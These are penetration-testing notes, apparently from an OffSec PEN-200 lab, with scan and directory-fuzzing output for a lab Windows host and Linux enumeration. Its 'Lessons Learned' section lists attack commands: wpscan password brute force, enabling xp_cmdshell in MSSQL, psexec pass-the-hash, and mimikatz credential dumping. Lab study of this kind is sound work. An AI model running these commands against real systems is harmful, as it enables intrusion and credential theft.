##### Machine Information
```markdown
IP ADDRESS: 10.11.1.223

HN:

OS: windows

EXPLOIT/PORT:

PRIVESC: 

USERS MENTIONED: Nicky a programmer that likes smoked sheese and has the personal blog

CREDENTIALS:
```

------------------------------------------------------------------------------------
###### Initial Scanning  
#ping
```shell
#ping 
┌──(root㉿kali)-[/home/kali]
└─# ping 10.11.1.101         

```
#rustscan 
```shell
┌──(root㉿kali)-[/home/kali]
└─# rustscan -a 10.11.1.223
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.11.1.223:21
Open 10.11.1.223:80
Open 10.11.1.223:135
Open 10.11.1.223:139
Open 10.11.1.223:443
Open 10.11.1.223:445
Open 10.11.1.223:3306
Open 10.11.1.223:3389
Open 10.11.1.223:5985
Open 10.11.1.223:47001
Open 10.11.1.223:49664
Open 10.11.1.223:49667
Open 10.11.1.223:49666
Open 10.11.1.223:49665
Open 10.11.1.223:49669
Open 10.11.1.223:49668
Open 10.11.1.223:49670
Open 10.11.1.223:49671
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

```
#quick #nmap #for #rustscan
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.111]
└─# nmap -sC -sV -p 21,80,135,139,443,445,3306,3389,5985,47001,49664,49665,49666,49667,49668,49670,49671 -Pn 10.11.1.223
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-02 02:37 EDT
Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.32% done; ETC: 02:38 (0:00:00 remaining)
Nmap scan report for 10.11.1.223
Host is up (0.056s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http          Apache httpd 2.4.38 ((Win64) OpenSSL/1.0.2q PHP/5.6.40)
|_http-server-header: Apache/2.4.38 (Win64) OpenSSL/1.0.2q PHP/5.6.40
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: ApPHP MicroBlog
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Win64) OpenSSL/1.0.2q PHP/5.6.40)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.38 (Win64) OpenSSL/1.0.2q PHP/5.6.40
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: ApPHP MicroBlog
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=jeff
| Not valid before: 2023-03-31T00:55:00
|_Not valid after:  2023-09-30T00:55:00
| rdp-ntlm-info: 
|   Target_Name: JEFF
|   NetBIOS_Domain_Name: JEFF
|   NetBIOS_Computer_Name: JEFF
|   DNS_Domain_Name: jeff
|   DNS_Computer_Name: jeff
|   Product_Version: 10.0.17763
|_  System_Time: 2023-04-02T06:38:44+00:00
|_ssl-date: 2023-04-02T06:38:52+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-04-02T06:38:48
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.31 seconds

```
#nmapudp
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sU 10.11.1.223                            
```
#nmapfulltcp
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p- -Pn 10.11.1.101
```
##### Initial Scanning Notes:
#initial #scanning #notes
- NOTES
- NOTES
- NOTES
  
##### Searchsploit Notes:
#searchsploit
- NOTES
- NOTES
- NOTES

##### Web Fuzzing : Dirsearch // GoBuster // ffuf // nikto
#gobuster #/usr/share/dirb/wordlists/common
```shell
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.11.1.223 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.1.223
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/04/02 02:53:46 Starting gobuster in directory enumeration mode
===============================================================
/applications.html    (Status: 200) [Size: 3607]
	#nothing here
/dashboard            (Status: 301) [Size: 339] [--> http://10.11.1.223/dashboard/]
	# XAMPP for Windows 5.6.40
/docs                 (Status: 301) [Size: 334] [--> http://10.11.1.223/docs/]
# empty directory
/favicon.ico          (Status: 200) [Size: 30894]
/feeds                (Status: 301) [Size: 335] [--> http://10.11.1.223/feeds/]
/images               (Status: 301) [Size: 336] [--> http://10.11.1.223/images/]
/Images               (Status: 301) [Size: 336] [--> http://10.11.1.223/Images/]
/img                  (Status: 301) [Size: 333] [--> http://10.11.1.223/img/]
/include              (Status: 301) [Size: 337] [--> http://10.11.1.223/include/]
/index.php            (Status: 200) [Size: 7345]
# reference image 1
/Index.php            (Status: 200) [Size: 7345]
# reference image 1
/index.php            (Status: 200) [Size: 7345]
# reference image 1
/install.txt          (Status: 200) [Size: 3598]
# reference image 2
/js                   (Status: 301) [Size: 332] [--> http://10.11.1.223/js/]
/license              (Status: 301) [Size: 337] [--> http://10.11.1.223/license/]
/LICENSE              (Status: 301) [Size: 337] [--> http://10.11.1.223/LICENSE/]
/mails                (Status: 301) [Size: 335] [--> http://10.11.1.223/mails/]
/modules              (Status: 301) [Size: 337] [--> http://10.11.1.223/modules/]
/readme.txt           (Status: 200) [Size: 2193]
#reference image 2
/Readme.txt           (Status: 200) [Size: 2193]
#reference image 2
/README.txt           (Status: 200) [Size: 2193]
#reference image 2
/themes               (Status: 301) [Size: 336] [--> http://10.11.1.223/themes/]
/Themes               (Status: 301) [Size: 336] [--> http://10.11.1.223/Themes/]
/webalizer            (Status: 403) [Size: 1044]
Progress: 27683 / 27690 (99.97%)
===============================================================
2023/04/02 02:57:08 Finished
===============================================================

```
#gobuster #bruteforce
```

gobuster dir -u http://192.168.111.110 -w
/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -t 250 -o
wordpress_gobuster
```
#dirsearch #/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```shell
#dirsearch medium.txt
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.111]
└─# dirsearch -u http://10.11.1.223 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /root/.dirsearch/reports/10.11.1.223/_23-04-02_02-54-00.txt

Error Log: /root/.dirsearch/logs/errors-23-04-02_02-54-00.log

Target: http://10.11.1.223/

[02:54:01] Starting: 
[02:54:01] 301 -  336B  - /images  ->  http://10.11.1.223/images/
[02:54:01] 301 -  333B  - /img  ->  http://10.11.1.223/img/
[02:54:01] 301 -  334B  - /docs  ->  http://10.11.1.223/docs/
[02:54:02] 301 -  336B  - /themes  ->  http://10.11.1.223/themes/
[02:54:02] 301 -  337B  - /modules  ->  http://10.11.1.223/modules/
[02:54:02] 301 -  336B  - /Images  ->  http://10.11.1.223/Images/
[02:54:02] 301 -  335B  - /feeds  ->  http://10.11.1.223/feeds/
[02:54:02] 403 -    1KB - /admin
[02:54:03] 301 -  337B  - /license  ->  http://10.11.1.223/license/
[02:54:04] 301 -  332B  - /js  ->  http://10.11.1.223/js/
[02:54:04] 301 -  337B  - /include  ->  http://10.11.1.223/include/
[02:54:05] 503 -    1KB - /examples
[02:54:05] 301 -  336B  - /Themes  ->  http://10.11.1.223/Themes/
[02:54:05] 403 -    1KB - /backup
[02:54:05] 403 -    1KB - /Page
[02:54:06] 403 -    1KB - /licenses
[02:54:07] 301 -  334B  - /Docs  ->  http://10.11.1.223/Docs/
[02:54:08] 301 -  339B  - /dashboard  ->  http://10.11.1.223/dashboard/
[02:54:09] 403 -    1KB - /Backup
[02:54:09] 301 -  337B  - /LICENSE  ->  http://10.11.1.223/LICENSE/
[02:54:10] 301 -  336B  - /IMAGES  ->  http://10.11.1.223/IMAGES/
[02:54:11] 403 -    1KB - /%20
[02:54:12] 301 -  333B  - /IMG  ->  http://10.11.1.223/IMG/
[02:54:15] 301 -  337B  - /License  ->  http://10.11.1.223/License/
[02:54:15] 301 -  337B  - /Modules  ->  http://10.11.1.223/Modules/
[02:54:16] 403 -    1KB - /Admin
[02:54:19] 403 -    1KB - /*checkout*
[02:54:23] 301 -  333B  - /Img  ->  http://10.11.1.223/Img/
[02:54:24] 301 -  332B  - /JS  ->  http://10.11.1.223/JS/
[02:54:28] 403 -    1KB - /phpmyadmin
[02:54:36] 403 -    1KB - /webalizer
[02:54:40] 403 -    1KB - /*docroot*
[02:54:42] 403 -    1KB - /*
[02:54:46] 403 -    1KB - /con
[02:54:51] 301 -  339B  - /Dashboard  ->  http://10.11.1.223/Dashboard/
[02:55:01] 301 -  334B  - /DOCS  ->  http://10.11.1.223/DOCS/
[02:55:16] 301 -  337B  - /Include  ->  http://10.11.1.223/Include/
[02:55:24] 403 -    1KB - /http%3A
[02:55:33] 403 -    1KB - /**http%3a
[02:55:42] 403 -    1KB - /*http%3A
[02:55:43] 301 -  335B  - /Feeds  ->  http://10.11.1.223/Feeds/
[02:55:43] 301 -  335B  - /xampp  ->  http://10.11.1.223/xampp/
[02:56:03] 403 -    1KB - /aux
[02:56:23] 403 -    1KB - /**http%3A
[02:56:47] 403 -    1KB - /%C0
[02:56:58] 403 -    1KB - /PAGE
[#######             ] 39% 87945/220545[#######             ] 39% 87946/220545[#######             ] 39% 87947/220545[#######             ] 39% 87948/220545[#######             ] 39% 87949/220545[#######             ] 39% 87950/220545[#######             ] 39% 87951/220545[#######             ] 39% 87952/220545[02:58:04] 403 -    1KB - /server-status
[02:58:26] 403 -    1KB - /%3FRID%3D2671
[02:58:35] 403 -    1KB - /devinmoore*
[02:58:47] 301 -  335B  - /mails  ->  http://10.11.1.223/mails/

```

```shell
# tcm recommended dirsearch
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -e php,html,js,asp,aspx -u http://10.11.1.234:10443 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#nikto #-a
```shell
┌──(root㉿kali)-[/home/kali]
└─# nikto -host 10.11.1.101:80  
```

#basic #ffuf
```shell
# basic ffuf scan - hail mary if nothing is found.
┌──(root㉿kali)-[/home/kali]
└─# ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u https://10.11.1.237/FUZZ
```

#wpscan #wordpress #plugin #reverse #shell #bruteforce #admin/princess #credentials
```shell
# Basic wpscan
┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://10.11.1.234:80

# WPscan bruteforce - reference 10.11.1.234 
┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://10.11.1.234:80/ --enumerate u,p,t -P rockyou.txt
```

Fuzzing notes:
- make sure if having issues to fuzzing to use all wordlists on kali machina and download seclists worst case scenario

##### Reverse Shell / Shell 

```shell
```

##### Foothold Enumeration Linux
#sudo #failed 
```shell
alfred@break:~/usr/bin$ sudo -l
[sudo] password for alfred: 
Sorry, user alfred may not run sudo on break.
alfred@break:~/usr/bin$ 
```
#cat #/etc/crontab
```shell
alfred@break:~/usr/bin$ cat /etc/crontab
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly 
```
#uname #-a #kernelprivesc
```shell
alfred@break:~$ uname -a
Linux break 4.4.0-166-generic #195-Ubuntu SMP Tue Oct 1 09:35:25 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
#cat #/etc*/release
```shell
alfred@break:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```
#lsb_release #-a 
```shell
alfred@break:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial
alfred@break:~$ 
```
#transfered #linpeas
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# ls               
linpeas.sh
                                                                          
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.11.1.101 - - [31/Mar/2023 19:51:13] "GET /linpeas.sh HTTP/1.1" 200 -

# pulled over linpeas
alfred@break:/tmp$ wget http://192.168.119.132/linpeas.sh
linpeas.sh                    100%[==============================================>] 808.68K  1.30MB/s    in 0.6s 
```
##### Foothold Enumeration Windows

```SHELL
```
##### Privilege Escalation
```shell
```

##### Flag
```powershell
```


###### Lessons Learned:


#ssh #portforwarding
```

In order to access the internal VNC port 5901, an SSH tunnel will need to be established
that will forward traffic from 5901 on Kali to the internal 5901 on the victim.
ssh -R 5901:127.0.0.1:5901 kali@192.168.11.11
```

#phpinfo

```shell
phpinfo.php is a file that contains a lot of information that can help attackers
when trying to target a system, such as: database information, host information, and software
version numbers.
```

#mssqlclient.py
```shell
# connecting with credentials
mssqlclient.py -port 1433 sa:D@t@b@535@192.168.132.1


#Enabling xp_cmdshell successfully allows system command execution in mssql
EXEC sp_configure ‘show advanced options’, ‘1’
RECONFIGURE
EXEC sp_configure ‘xp_cmdshell’, ‘1’
RECONFIGURE
EXEC xp_cmdshell ‘net user’;
```

#psexec #mimikatz

```shell
# generic psexec login with psexec
psexec.py <user> @127.0.0.1 -hashes :NTLM_HASH_HERE

# how to upload files or mimikatz using psexec
lput mimikatz.exe

#mimikatz dumping of credentials
mimikatz.exe privilege::debug sekurlsa::logonpasswords
```